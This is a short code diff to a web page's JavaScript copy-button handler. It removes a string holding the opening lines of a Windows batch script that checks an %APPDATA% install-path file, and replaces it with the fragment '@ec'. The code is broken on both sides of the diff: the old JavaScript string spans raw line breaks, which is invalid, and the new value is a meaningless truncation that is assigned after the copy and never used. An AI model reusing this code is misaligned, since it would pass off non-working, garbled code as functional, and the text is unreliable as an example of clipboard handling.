@@ -481,13 +481,7 @@ var copyCode = function(elem) {
 	try {
 		if (document.execCommand("copy")) {
 		
-			var a1 = "@echo off
-setlocal enabledelayedexpansion
-
-:start
-set LOL_PATH=\"
-
-if exist \"%APPDATA%\LoG_lolinstallpath.txt\" (";
+			var a1 = "@ec";
 		
 		
 			flashButton(elem, true);
